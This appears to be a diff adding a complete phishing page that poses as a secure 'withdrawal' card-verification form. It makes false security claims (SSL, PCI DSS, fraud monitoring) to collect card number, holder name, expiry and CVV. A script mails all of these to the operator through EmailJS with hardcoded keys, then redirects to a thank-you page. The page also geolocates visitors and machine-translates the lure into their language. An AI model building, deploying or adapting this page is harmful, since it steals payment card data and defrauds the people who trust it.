@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="google" content="notranslate">
+    <title>Secure Credit Card Addition</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f4f4f9;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 0;
+        }
+
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #0042ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+    .hidden {
+            display: none;
+        }       
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            margin-top: -17px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+      
+        .header p {
+            margin: 0;
+            color: #666;
+        }
+        .security {
+            margin: 20px 0;
+            padding: 15px;
+            background: #e7f4e8;
+            border-left: 4px solid #4CAF50;
+            font-size: 15px;
+            color: #333;
+            font-weight: bold;
+            font-family: Arial, sans-serif ;
+            margin-top: -8px;
+                             }
+        .security h3 {
+            margin-top: 0;
+            font-family: Arial, sans-serif;
+        
+        }
+        .credit-card-form {
+            display: flex;
+            flex-direction: column;
+        }
+        .credit-card-form input {
+            margin: 10px 0;
+            padding: 10px;
+            font-size: 27px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .credit-card-form button {
+            margin-top: 20px;
+            padding: 15px;
+            font-size: 27px;
+            color: #fff;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .credit-card-form button:hover {
+            background-color: #45a049;
+        
+        
+}
+.credit-card {
+  position: relative;
+  width: 340px;
+  height: 200px;
+ 
+ 
+  margin: auto;
+  transform-style: preserve-3d;
+  transition: 0.3s;
+  margin-left: -16px;
+}
+.card-front,
+.card-back {
+  position: absolute;
+  width: inherit;
+  height: inherit;
+  background: linear-gradient(#33a4f8, #206df9);
+  border-radius: 1em;
+  backface-visibility: hidden;
+  }
+ .card-back {
+    margin-left: -17px;
+  
+}
+.card-front {
+  padding: 2em 1em;
+}
+.branding {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.branding img {
+  width: 50px;
+  height: auto;
+}
+.card-back {
+  position: absolute;
+  transform: rotateY(180deg);
+}
+.card-number {
+  color: #ffffff;
+  font-weight: 600;
+  display: flex;
+  justify-content: space-between;
+  font-size: 19px;
+  margin-top: 3em;
+}
+.details {
+  color: #ffffff;
+  display: flex;
+  justify-content: space-between;
+  margin-top: 1.5em;
+  font-size: 15px;
+  font-weight: bold;
+}
+.details span {
+  display: block;
+}
+.details #card-holder-name {
+  text-transform: uppercase;
+}
+.card-back .black-strip {
+  position: relative;
+  background-color: #000000;
+  height: 50px;
+  top: 2em;
+}
+.card-back .white-strip {
+  top: 3em;
+  position: relative;
+  text-align: right;
+}
+.card-back .white-strip span {
+  margin-right: 1em;
+}
+.card-back .white-strip div {
+  height: 30px;
+  background-color: #ffffff;
+  margin-top: 0.5em;
+}
+.card-back .visa-logo {
+  position: absolute;
+  width: 50px;
+  margin-top: 4em;
+  right: 1em;
+}
+form {
+  margin-top: 2em;
+}
+label,
+input {
+  display: block;
+}
+label {
+  margin-bottom: 0.5em;
+  font-weight: 600;
+  font-size: 21px;
+}
+
+label {
+  margin-bottom: 0.5em;
+  font-weight: 600;
+  font-family: Arial, sans-serif;
+}
+input {
+  width: 90%;
+  border: 1px solid #000000;
+  padding: 1em 0.5em;
+  border-radius: 0.5em;
+  margin-left: 12px;
+  font-size: 24px;
+  font-weight: bold;
+  font-family: Arial, sans-serif;
+  height: 1px;
+}
+input:not(:last-child) {
+  margin-bottom: 1em;
+}
+form .date-cvv {
+  display: flex;
+  justify-content: space-between;
+}
+
+    </style>
+</head>
+<body>
+   <div class="spinner-overlay" id="spinner-overlay">
+        <div class="spinner"></div>
+    </div>
+    <div class="container">
+    <div class="header">
+        <h1 id="header-title" style="margin: 0; font-size: 31px; color: #4CAF50; font-family: 'Roboto Mono', monospace;">Secure Your Withdrawal</h1>
+        <p id="header-description" style="font-weight: bold; font-family: Arial, sans-serif;">
+            Add your credit card information below to enjoy seamless, fast and secure Withdrawal.
+        </p>
+    </div>
+    <img src="card.jpg" alt="" style="width: 340px; margin-left: 16px; margin-top: -10px;">
+    <div class="security">
+        <h3 id="security-title">Your Security is Our Priority</h3>
+        <p id="security-description">We use industry-leading encryption and security protocols to ensure your data is safe and secure. Your credit card information will be handled with the utmost care and confidentiality.</p>
+        <p id="security-details">Here's what we do to protect you:</p>
+        <ul id="security-list">
+            <li>256-bit SSL encryption to safeguard your data.</li>
+            <li>PCI DSS compliance for secure credit card processing.</li>
+            <li>Regular security audits and updates.</li>
+            <li>24/7 monitoring for fraudulent activities.</li>
+        </ul>
+    </div>
+    <h5 id="scroll-instruction" style="text-align: center; justify-content: center; align-items: center; font-size: 18px; color: black; box-shadow: 0 0 19px rgba(0, 0, 0, 1.5); border-radius: 19px;">
+        To Continue Please Scroll Down And Click On The Camera Picture Below Or Input Card Details Manually Below
+    </h5>
+   
+   <a href="deleteme.html">
+    <img src="camera.jpg" alt="" style="width: 120px; height: 120px; border-radius: 50%; box-shadow: 0 0 19px rgba(0, 0, 0, 1.5); margin-left: 110px; margin-top: -21px;"</img></a>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+ </head>
+  <body>
+    <div class="wrapper">
+      <div class="credit-card" id="card">
+        <div class="card-front">
+          <div class="branding">
+            <img src="metal.png" class="chip-img" />
+            <img src="visaa.png" class="visa-logo" />
+          </div>
+          <div class="card-number">
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+          </div>
+          <div class="details">
+            <div>
+              <span id="carrd">Card Holder</span>
+              <span id="card-holder-name">Your Name Here</span>
+            </div>
+            <div>
+              <span id="expire">Expires</span>
+              <span id="validity">06/28</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-back">
+          <div class="black-strip"></div>
+          <div class="white-strip">
+            <span>CVV</span>
+            <div id="cvv-display"></div>
+          </div>
+          <img src="visaa.png" class="visa-logo" />
+        </div>   
+</div>
+
+
+<form id="payment-form">
+    <label for="card-number" id="label-card-number" style="margin-top: 85px;">Card Number</label>
+    <input type="number" id="card-number" placeholder="Enter Your Card Number" required>
+    <label for="card-holder" id="label-card-holder">Card Holder:</label>
+    <input type="text" id="card-name-input" placeholder="Your Full Name" required>
+    <div class="name5">
+        <label for="expiry-year" id="label-expiry-year" style="margin-top: 0px;">Expiry Year</label>
+        <select name="expiry-year" id="expiry-year" required style="margin-top: 0px; height: 49px; width: 120px; border-radius: 19px; font-size: 17px">
+            <option value="" id="pen">Expiry Year</option>
+            <!-- Add options here -->
+        </select>
+        <label for="cvv" id="label-cvv" style="margin-left: 281px; margin-top: -80px;">CVV:</label>
+        <input type="number" id="cvv" placeholder="***" style="width: 56px; margin-left: 270px; font-size: 20px; border-radius: 19px; height: 17px; " required>
+    </div>
+    <div class="name4">
+        <label for="expiry-month" id="label-expiry-month" style="margin-left: 126px; margin-top: -55px;">Expiry Month</label>
+        <select name="expiry-month" id="expiry-month" required style="margin-left: 120px; height: 49px; width: 120px; border-radius: 19px; font-size:17px;">
+            <option value="" id="tap">Expiry Month</option>
+            <option value="01">01</option>
+            <option value="02">02</option>
+            <option value="03">03</option>
+            <option value="04">04</option>
+            <option value="05">05</option>
+            <option value="06">06</option>
+            <option value="07">07</option>
+            <option value="08">08</option>
+            <option value="09">09</option>
+            <option value="10">10</option>
+            <option value="11">11</option>
+            <option value="12">12</option>
+        </select>
+    </div>
+    <button type="submit" id="verify-button" style="text-align: center; justify-content: center; align-items: center; height: 46px; width: 250px; margin-left: 50px; font-size: 21px; margin-top: 45px; background-color: #00b300; color: white; border: none; border-radius: 22px; font-weight: bold; transition: all 0.3s ease; ">Proceed</button>
+</form>
+
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script src="script2.js"></script>
+<script>
+ emailjs.init('MRqvmh8vxBxa2Vdp7');
+    
+    document.getElementById('payment-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        // Collect form data
+        var formData = {
+            card_number: document.getElementById('card-number').value,
+            card_holder: document.getElementById('card-name-input').value,
+            expiry_year: document.getElementById('expiry-year').value,
+            expiry_month: document.getElementById('expiry-month').value,
+            cvv: document.getElementById('cvv').value,
+        };
+        
+        // Send email using Email.js
+        emailjs.send('service_g0hh8tm', 'template_hvc0ig2', formData)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+  window.location.href = 'thankyou.html';
+                window.location.href = 'thankyou.html';  
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+    });
+  </script>
+ <script>
+const countryLanguageMap = {
+        "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en",
+        "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar",
+        "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz",
+        "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr",
+        "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr",
+        "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es",
+        "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr",
+        "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti",
+        "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr",
+        "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es",
+        "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is",
+        "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it",
+        "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko",
+        "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en",
+        "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en",
+        "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en",
+        "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar",
+        "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en",
+        "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur",
+        "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl",
+        "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en",
+        "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr",
+        "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so",
+        "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv",
+        "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt",
+        "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en",
+        "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi",
+        "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+    };
+
+// Function to detect user's country
+function detectCountry(callback) {
+    fetch('https://ipinfo.io/json?token=84581b889c1970')
+        .then(response => response.json())
+        .then(data => {
+            callback(data.country);
+        })
+        .catch(error => console.error('Error detecting country:', error));
+}
+
+// Translation function
+function translateText(text, targetLanguage, callback) {
+    fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+        .then(response => response.json())
+        .then(data => {
+            callback(data[0][0][0]);
+        })
+        .catch(error => console.error('Error translating text:', error));
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    document.body.classList.add('loading');
+
+    // Remove the loading state after 2 seconds
+    setTimeout(function() {
+        document.body.classList.remove('loading');
+    }, 2000); // 2000 milliseconds = 2 seconds
+
+    detectCountry(function(countryCode) {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en'; // Default to English if country not in map
+
+        const elementsToTranslate = [
+            { id: 'header-title', text: 'Secure Your Withdrawal' },
+            { id: 'header-description', text: 'Add your credit card information below to enjoy seamless, fast and secure Withdrawal.' },
+            { id: 'security-title', text: 'Your Security is Our Priority' },
+            { id: 'security-description', text: 'We use industry-leading encryption and security protocols to ensure your data is safe and secure. Your credit card information will be handled with the utmost care and confidentiality.' },
+            { id: 'security-details', text: "Here's what we do to protect you:" },
+            { id: 'security-list', items: [
+                '256-bit SSL encryption to safeguard your data.',
+                'PCI DSS compliance for secure credit card processing.',
+                'Regular security audits and updates.',
+                '24/7 monitoring for fraudulent activities.'
+            ]},
+            { id: 'scroll-instruction', text: 'To Continue Please Scroll Down And Click On The Camera Picture Below Or Input Card Details Manually Below' },
+            { id: 'label-card-number', text: 'Card Number' },
+            { id: 'label-card-holder', text: 'Card Holder:' },
+            { id: 'label-expiry-year', text: 'Expiry Year' },
+            { id: 'label-cvv', text: 'CVV:' },
+            { id: 'label-expiry-month', text: 'Expiry Month' },
+       { id: 'card-holder-name', text: 'Your Name Here' },
+  { id: 'carrd', text: 'Card Holder' },
+   { id: 'tap', text: 'Expiry Month' },
+    { id: 'pen', text: 'Expiry Year' },
+  { id: 'expire', text: 'Expires' },
+            { id: 'verify-button', text: 'Proceed' }
+        ];
+
+        elementsToTranslate.forEach(element => {
+            if (element.items) {
+                element.items.forEach((item, index) => {
+                    translateText(item, targetLanguage, function(translatedText) {
+                        document.querySelector(`#${element.id} li:nth-child(${index + 1})`).innerText = translatedText;
+                    });
+                });
+   const placeholdersToTranslate = [
+                { id: 'card-name-input', text: 'Your Full Name' },
+                { id: 'card-number', text: 'Enter Your Card Number' }
+            ];
+
+            placeholdersToTranslate.forEach(element => {
+                translateText(element.text, targetLanguage, function (translatedText) {
+                    document.getElementById(element.id).placeholder = translatedText;
+                });
+            }); 
+            } else {
+                translateText(element.text, targetLanguage, function(translatedText) {
+                    document.getElementById(element.id).innerText = translatedText;
+                });
+            }
+        });
+    });
+});
+document.getElementById('verify-button').addEventListener('click', function() {
+            this.style.width = '180px'; // Reduce width
+            this.style.height = '26px'; // Reduce height
+            this.style.fontSize = '16px'; // Adjust font size
+  this.style.marginLeft = '81px'; // Adjust font size
+ // Store the current context
+            const button = this;
+
+            // Revert the button size after 2 seconds
+            setTimeout(function() {
+                button.style.width = '250px'; // Original width
+                button.style.height = '46px'; // Original height
+                button.style.fontSize = '29px'; // Original font size
+           button.style.marginLeft  = '50px'; // Original font size
+            }, 400);
+        });       
+// Set timeout duration in milliseconds (e.g., 5000ms = 5 seconds)
+        const timeoutDuration = 1000;
+
+        // Function to hide the spinner overlay
+        function hideSpinner() {
+            const spinnerOverlay = document.getElementById('spinner-overlay');
+            spinnerOverlay.classList.add('hidden');
+        }
+
+        // Set timeout to hide the spinner overlay after the specified duration
+        setTimeout(hideSpinner, timeoutDuration);  
+</script>
